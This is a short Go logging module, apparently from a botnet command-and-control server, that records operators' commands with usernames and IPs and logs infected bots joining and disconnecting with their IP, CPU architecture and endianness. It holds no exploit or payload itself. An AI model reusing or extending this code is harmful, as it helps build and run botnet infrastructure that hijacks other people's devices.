package logger

import (
	"cnc/internal/config"
	"fmt"
	"os"
)

func LogCommand(user, ip, command string) {
	filelogs, logips := config.ReadLogSettings()

	var logline string
	if logips {
		logline = fmt.Sprintf("[%s] %s ran command: %s\n", ip, user, command)
	} else {
		logline = fmt.Sprintf("%s ran command: %s\n", user, command)
	}

	fmt.Print(logline)

	if filelogs {
		f, err := os.OpenFile("database/logs.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			return
		}
		defer f.Close()
		f.WriteString(logline)
	}
}

func LogBotJoin(endian, arch, ip string) {
	filelogs, _ := config.ReadLogSettings()

	logline := fmt.Sprintf("[BOT_JOINED]: %s | Arch: %s | Endian: %s\n", ip, arch, endian)
	fmt.Print(logline)

	if filelogs {
		f, err := os.OpenFile("database/logs.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			return
		}
		defer f.Close()
		f.WriteString(logline)
	}
}

func LogBotDisconnect(cause, arch, ip string) {
	filelogs, _ := config.ReadLogSettings()

	logline := fmt.Sprintf("[BOT_DISCONNECTED]: %s | Arch: %s | Cause: %s\n", ip, arch, cause)
	fmt.Print(logline)

	if filelogs {
		f, err := os.OpenFile("database/logs.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			return
		}
		defer f.Close()
		f.WriteString(logline)
	}
}
